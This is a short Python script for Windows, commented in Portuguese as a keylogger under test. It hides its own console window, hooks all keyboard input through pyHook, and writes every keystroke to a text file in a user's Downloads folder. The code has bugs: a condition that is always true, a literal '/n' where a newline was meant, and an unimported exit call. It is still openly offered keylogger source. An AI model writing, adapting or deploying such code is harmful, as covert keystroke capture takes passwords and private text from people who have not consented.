#!/usr/bin/env python
import win32console
import win32gui
import pythoncom
import pyHook

# Keylogger em fase de testes...

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        f=open('C:\Users\fbelo\Downloads\output.txt','r+')
        buffer=f.read()
        f.close()
        f=open('C:\Users\fbelo\Downloads\output.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()
f1 = open('C:\Users\fbelo\Downloads\output.txt', 'w')
f1.write('Incoming keys:\n')
f1.close()
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()